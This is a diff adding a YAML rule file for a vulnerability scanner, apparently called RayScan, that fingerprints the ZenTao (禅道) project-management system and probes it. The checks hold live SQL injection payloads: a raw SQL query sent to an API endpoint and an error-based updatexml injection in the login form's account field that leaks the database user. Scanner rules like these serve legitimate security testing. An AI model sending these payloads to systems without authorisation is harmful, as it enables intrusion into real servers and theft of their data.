@@ -1,0 +1,35 @@
+# RayScan OA 检测规则 — 禅道-Zentao
+# 由 T3.3 规则外部化生成，加载器: wvs/modules/oa/rules_loader.py
+# 字段说明见 rules/README.md 与 docs/OA_RULES.md
+# 注意: evidence/max_version 等字符串值必须加引号（防止 YAML 解析成数字）
+
+name: 禅道-Zentao
+paths:
+- /zentao/
+- /chanzhi/
+keywords:
+- zentao
+- 禅道
+- zentaopms
+fingerprints:
+- match: title
+  value: 禅道
+- match: html
+  value: zentao
+- match: html
+  value: zentaopms
+- match: cookie
+  value: zentaosid
+checks:
+- path: /zentao/api-getModel-api-sql.json
+  params:
+    sql: select+1
+  type: sqli
+  severity: critical
+- path: /zentao/user-login.html
+  method: POST
+  params:
+    account: admin' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1'='1
+  type: sqli
+  severity: high
+  evidence: xpath syntax error
